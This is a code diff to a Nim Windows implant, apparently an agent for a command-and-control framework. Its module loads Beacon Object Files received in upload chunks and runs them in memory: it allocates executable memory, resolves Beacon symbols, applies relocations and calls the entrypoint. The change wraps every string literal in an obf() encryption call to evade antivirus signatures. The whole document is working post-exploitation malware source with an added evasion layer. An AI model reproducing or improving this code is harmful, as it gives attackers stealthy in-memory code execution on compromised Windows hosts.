@@ -1,4 +1,5 @@
 import json
+import ../utils/strenc
 
 when defined(windows):
   import base64, strutils
@@ -39,12 +40,12 @@ when defined(windows):
     write32Le(p, read32Le(p) + v)
 
   proc getExternalFunctionAddress(symbolName: string): uint64 =
-    if not symbolName.startsWith("__imp_"):
+    if not symbolName.startsWith(obf("__imp_")):
       return 0
     
     let symbolWithoutPrefix = symbolName[6..^1]
     
-    if symbolName.startsWith("__imp_Beacon") or symbolName.startsWith("__imp_toWideChar"):
+    if symbolName.startsWith(obf("__imp_Beacon")) or symbolName.startsWith(obf("__imp_toWideChar")):
       for i in 0..22:
         if symbolWithoutPrefix == functionAddresses[i].name:
           return functionAddresses[i].address
@@ -107,18 +108,18 @@ when defined(windows):
     var sections: seq[SectionInfo] = @[]
     
     for i in 0..<cast[int](fileHeader.NumberOfSections):
-      if $cast[cstring](addr sectionCursor.Name[0]) == ".text":
+      if $cast[cstring](addr sectionCursor.Name[0]) == obf(".text"):
         textSection = sectionCursor
       sections.add(SectionInfo(Name: $cast[cstring](addr sectionCursor.Name[0]), SectionOffset: totalSize, SectionHeaderPtr: sectionCursor))
       totalSize += sectionCursor.SizeOfRawData
       sectionCursor += 1
     
     if textSection == nil:
-      return (false, "[!] .text section not found")
+      return (false, obf("[!] .text section not found"))
     
     let allocatedMemory = VirtualAlloc(nil, cast[UINT32](totalSize + getNumberOfExternalFunctions(fileBuffer, textSection)), MEM_COMMIT or MEM_RESERVE or MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE)
     if allocatedMemory == nil:
-      return (false, "[!] Memory allocation failed")
+      return (false, obf("[!] Memory allocation failed"))
     
     sectionCursor = sectionHeaderArray
     var memoryCursor: uint64 = 0
@@ -127,7 +128,7 @@ when defined(windows):
       memoryCursor += sectionCursor.SizeOfRawData
       sectionCursor += 1
     
-    output.add("[+] Sections copied\n")
+    output.add(obf("[+] Sections copied\n"))
     
     let symbolTable = cast[ptr SymbolTableEntry](cast[uint](unsafeAddr(fileBuffer[0])) + cast[uint](fileHeader.PointerToSymbolTable))
     var externalFuncStore = cast[ptr uint64](totalSize + cast[uint64](allocatedMemory))
@@ -150,12 +151,12 @@ when defined(windows):
             externalFuncCount += 1
           else:
             discard VirtualFree(allocatedMemory, 0, MEM_RELEASE)
-            return (false, "[!] Unknown symbol: " & symbolName)
+            return (false, obf("[!] Unknown symbol: ") & symbolName)
         else:
           let sectionIndex = cast[int](symbolCursor.SectionNumber - 1)
           if sectionIndex < 0 or sectionIndex >= sections.len:
             discard VirtualFree(allocatedMemory, 0, MEM_RELEASE)
-            return (false, "[!] Invalid section index")
+            return (false, obf("[!] Invalid section index"))
           var sectionStart = cast[uint64](allocatedMemory) + sections[sectionIndex].SectionOffset
           if symbolCursor.StorageClass == IMAGE_SYM_CLASS_EXTERNAL:
             for k in 0..<sections.len:
@@ -165,7 +166,7 @@ when defined(windows):
           applyGeneralRelocations(patchAddr, sectionStart, relocCursor.Type, symbolCursor.Value)
         relocCursor += 1
     
-    output.add("[+] Relocations completed\n")
+    output.add(obf("[+] Relocations completed\n"))
     
     var entryAddr: uint64 = 0
     for i in 0..<cast[int](fileHeader.NumberOfSymbols):
@@ -176,9 +177,9 @@ when defined(windows):
     
     if entryAddr == 0:
       discard VirtualFree(allocatedMemory, 0, MEM_RELEASE)
-      return (false, "[!] Entrypoint '" & functionName & "' not found")
+      return (false, obf("[!] Entrypoint '") & functionName & obf("' not found"))
     
-    output.add("[+] Entrypoint found, executing...\n")
+    output.add(obf("[+] Entrypoint found, executing...\n"))
     
     let entryPtr = cast[COFFEntry](entryAddr)
     if argumentBuffer.len == 0:
@@ -186,11 +187,11 @@ when defined(windows):
     else:
       entryPtr(unsafeAddr argumentBuffer[0], cast[uint32](argumentBuffer.len))
     
-    output.add("[+] BOF execution completed\n")
+    output.add(obf("[+] BOF execution completed\n"))
     
     let outData = BeaconGetOutputData(nil)
     if outData != nil:
-      output.add("\n=== BOF Output ===\n" & $outData & "\n==================\n")
+      output.add(obf("\n=== BOF Output ===\n") & $outData & obf("\n==================\n"))
     
     discard VirtualFree(allocatedMemory, 0, MEM_RELEASE)
     return (true, output)
@@ -199,13 +200,13 @@ const CHUNK_SIZE = 512000
 
 proc inlineExecute*(taskId: string, params: JsonNode): JsonNode =
   when not defined(windows):
-    return %*{"task_id": taskId, "completed": true, "status": "error", "user_output": "inline_execute is only supported on Windows"}
+    return %*{obf("task_id"): taskId, obf("completed"): true, obf("status"): "error", obf("user_output"): obf("inline_execute is only supported on Windows")}
   else:
     try:
       let args = to(params, InlineExecuteArgs)
-      return %*{"task_id": taskId, "upload": {"file_id": args.uuid, "chunk_num": 1, "chunk_size": CHUNK_SIZE, "full_path": ""}}
+      return %*{obf("task_id"): taskId, obf("upload"): {obf("file_id"): args.uuid, obf("chunk_num"): 1, obf("chunk_size"): CHUNK_SIZE, obf("full_path"): ""}}
     except Exception as e:
-      return %*{"task_id": taskId, "completed": true, "status": "error", "user_output": "Failed to parse parameters: " & e.msg}
+      return %*{obf("task_id"): taskId, obf("completed"): true, obf("status"): "error", obf("user_output"): obf("Failed to parse parameters: ") & e.msg}
 
 proc processInlineExecuteChunk*(taskId: string, params: JsonNode, chunkData: string, totalChunks: int, currentChunk: int, fileData: var seq[byte]): JsonNode =
   when defined(windows):
@@ -216,23 +217,23 @@ proc processInlineExecuteChunk*(taskId: string, params: JsonNode, chunkData: str
         fileData.add(cast[byte](b))
       
       if currentChunk < totalChunks:
-        return %*{"task_id": taskId, "upload": {"chunk_size": CHUNK_SIZE, "file_id": args.uuid, "chunk_num": currentChunk + 1, "full_path": ""}}
+        return %*{obf("task_id"): taskId, obf("upload"): {obf("chunk_size"): CHUNK_SIZE, obf("file_id"): args.uuid, obf("chunk_num"): currentChunk + 1, obf("full_path"): ""}}
       
-      var output = "Executing Beacon Object File...\n"
+      var output = obf("Executing Beacon Object File...\n")
       var argumentBuffer: seq[byte] = @[]
       if args.bof_arguments.len > 0:
         argumentBuffer = hexStringToByteArray(args.bof_arguments)
         if argumentBuffer.len == 0 and args.bof_arguments.len > 0:
-          return %*{"task_id": taskId, "completed": true, "status": "error", "user_output": "[!] Error parsing arguments"}
+          return %*{obf("task_id"): taskId, obf("completed"): true, obf("status"): "error", obf("user_output"): obf("[!] Error parsing arguments")}
       
       let (success, bofOutput) = runCOFF(args.bof_entrypoint, fileData, argumentBuffer)
       output.add(bofOutput)
       
       if not success:
-        return %*{"task_id": taskId, "completed": true, "status": "error", "user_output": output}
+        return %*{obf("task_id"): taskId, obf("completed"): true, obf("status"): "error", obf("user_output"): output}
       
-      return %*{"task_id": taskId, "completed": true, "status": "success", "user_output": output}
+      return %*{obf("task_id"): taskId, obf("completed"): true, obf("status"): obf("success"), obf("user_output"): output}
     except Exception as e:
-      return %*{"task_id": taskId, "completed": true, "status": "error", "user_output": "Failed to execute BOF: " & e.msg}
+      return %*{obf("task_id"): taskId, obf("completed"): true, obf("status"): "error", obf("user_output"): obf("Failed to execute BOF: ") & e.msg}
   else:
-    return %*{"task_id": taskId, "completed": true, "status": "error", "user_output": "inline_execute is only supported on Windows"}
+    return %*{obf("task_id"): taskId, obf("completed"): true, obf("status"): "error", obf("user_output"): obf("inline_execute is only supported on Windows")}
